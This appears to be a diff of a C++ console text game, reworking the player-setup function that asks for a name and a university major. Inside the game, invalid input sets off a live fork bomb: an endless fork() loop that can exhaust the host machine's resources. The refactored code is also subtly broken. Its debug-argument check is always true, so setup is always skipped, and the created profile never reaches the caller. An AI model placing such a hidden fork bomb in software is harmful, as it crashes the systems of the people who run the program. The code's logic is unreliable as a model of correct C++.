@@ -2,8 +2,7 @@
 #include "core_functions.hpp"
 using namespace std;
 
-// Game duration -- 50 days
-int globalActionLimit = 50;
+
 
 // refactor to use unistd.h
 const chrono::nanoseconds fractionalNS = 250ms;
@@ -161,7 +160,7 @@ void grabInput(int &x)
 
 void constructScenarioList(scenario *scenarioHead)
 {
-    struct scenario *scenarioNode = new scenario;
+    struct scenario *scenarioNode = new struct scenario;
     scenarioNode->next = NULL;
 
     scenarioHead = scenarioNode;
@@ -204,95 +203,105 @@ void constructScenarioList(scenario *scenarioHead)
     return;
 }
 
-void initalizeGame(struct userProfile *currUser)
+void initalizeGame(userProfile *newUser, char *argument)
 {
 
-    currUser = new userProfile;
-
-    string userName;
-    cout << "What is your name?" << endl;
-    getline(cin, userName);
-    this_thread::sleep_for(fractionalNS);
-    cout << "Hello " << userName << endl;
-    this_thread::sleep_for(smallNS);
-
-    cout << "Welcome to Game 3. Happy you've made it here so far. " << endl;
-
-    this_thread::sleep_for(smallNS);
-    cout << "What is your Major?" << endl;
-    this_thread::sleep_for(fractionalNS);
-    cout << "0 for Questrom" << endl;
-    cout << "1 for Engineering" << endl;
-    cout << "2 for CAS" << endl;
-    cout << "3 if you're a dropout" << endl;
-
-    int userMajor = INT16_MAX;
-    grabInput(userMajor);
-    this_thread::sleep_for(fractionalNS);
-
-    if (userMajor == 0)
-        cout << "Look guys, Daddy's Money just took human form. HA!" << endl;
-    else if (userMajor == 1)
-        cout << "Great, go shower. You smell" << endl;
-    else if (userMajor == 2)
-        cout << "Well, you're SOOO unique, aren't you?" << endl;
-    else if (userMajor == 3)
-        cout << "Righteous, stick it to the man." << endl;
-    this_thread::sleep_for(fractionalNS);
-
-    switch (userMajor)
+    userProfile *currUser = new userProfile();
+    string arg1 = (string)argument;
+    if (arg1 == argument)
+        {
+            currUser->setMajor(DROPOUT);
+            currUser->setName("debug");
+            goto endfunction;
+        }
+    else
     {
-    case 0:
-        currUser->major = QST;
-        break;
-    case 1:
-        currUser->major = ENG;
-        break;
-    case 2:
-        currUser->major = CAS;
-        break;
-    case 3:
-        currUser->major = DROPOUT;
-        break;
-
-    default:
-        cout << "Your Input was incorrect. I thought the instructions were clear." << endl;
+        string userName;
+        cout << "What is your name?" << endl;
+        getline(cin, userName);
+        this_thread::sleep_for(fractionalNS);
+        cout << "Hello " << userName << endl;
         this_thread::sleep_for(smallNS);
-        cout << "..." << endl;
-        cout << "Do you really think you will get off that easy?" << endl;
-        this_thread::sleep_for(smallNS);
-        cout << "I'll show you how deep this rabbit hole goes, " << currUser->name << endl;
 
-        for (int i = 0; i < 20; i++)
+        cout << "Welcome to Game 3. Happy you've made it here so far. " << endl;
+
+        this_thread::sleep_for(smallNS);
+        cout << "What is your Major?" << endl;
+        this_thread::sleep_for(fractionalNS);
+        cout << "0 for Questrom" << endl;
+        cout << "1 for Engineering" << endl;
+        cout << "2 for CAS" << endl;
+        cout << "3 if you're a dropout" << endl;
+
+        int userMajor = INT16_MAX;
+        grabInput(userMajor);
+        this_thread::sleep_for(fractionalNS);
+
+        if (userMajor == 0)
+            cout << "Look guys, Daddy's Money just took human form. HA!" << endl;
+        else if (userMajor == 1)
+            cout << "Great, go shower. You smell" << endl;
+        else if (userMajor == 2)
+            cout << "Well, you're SOOO unique, aren't you?" << endl;
+        else if (userMajor == 3)
+            cout << "Righteous, stick it to the man." << endl;
+        this_thread::sleep_for(fractionalNS);
+
+        switch (userMajor)
         {
-            cout << endl;
+        case 0:
+            currUser->setMajor(QST);
+            break;
+        case 1:
+            currUser->setMajor(ENG);
+            break;
+        case 2:
+            currUser->setMajor(CAS);
+            break;
+        case 3:
+            currUser->setMajor(DROPOUT);
+            break;
+
+        default:
+            cout << "Your Input was incorrect. I thought the instructions were clear." << endl;
+            this_thread::sleep_for(smallNS);
+            cout << "..." << endl;
+            cout << "Do you really think you will get off that easy?" << endl;
+            this_thread::sleep_for(smallNS);
+            cout << "I'll show you how deep this rabbit hole goes, " << currUser->getName() << endl;
+
+            for (int i = 0; i < 20; i++)
+            {
+                cout << endl;
+            }
+
+            matrixArt();
+
+            while (true)
+            {
+                fork();
+                cout << "Not so funny now, huh?" << endl;
+            }
+
+            break;
         }
 
-        matrixArt();
+        cout << "You said your major was: " << currUser->getMajor() << endl;
+        this_thread::sleep_for(smallNS);
 
-        while (true)
-        {
-            fork();
-            cout << "Not so funny now, huh?" << endl;
-        }
+        string redHerring;
+        cout << "Do you know the secret password?" << endl;
+        cin >> redHerring;
+        cout << "Password Accepted!" << endl;
+        cout << "Just kidding, no shortcuts here" << endl;
+        this_thread::sleep_for(smallNS);
+        cout << "SETUP COMPLETE" << endl;
 
-        break;
+        currUser->setName(userName);
+        this_thread::sleep_for(smallNS);
     }
 
-    cout << "You said your major was: " << currUser->major << endl;
-    this_thread::sleep_for(smallNS);
-
-    string redHerring;
-    cout << "Do you know the secret password?" << endl;
-    cin >> redHerring;
-    cout << "Password Accepted!" << endl;
-    cout << "Just kidding, no shortcuts here" << endl;
-    this_thread::sleep_for(smallNS);
-    cout << "SETUP COMPLETE" << endl;
-
-    currUser->name = userName;
-    currUser->timeRemaining = globalActionLimit;
-    this_thread::sleep_for(smallNS);
-
+endfunction:
+    newUser = currUser;
     cout << "STARTING GAME" << endl;
 }
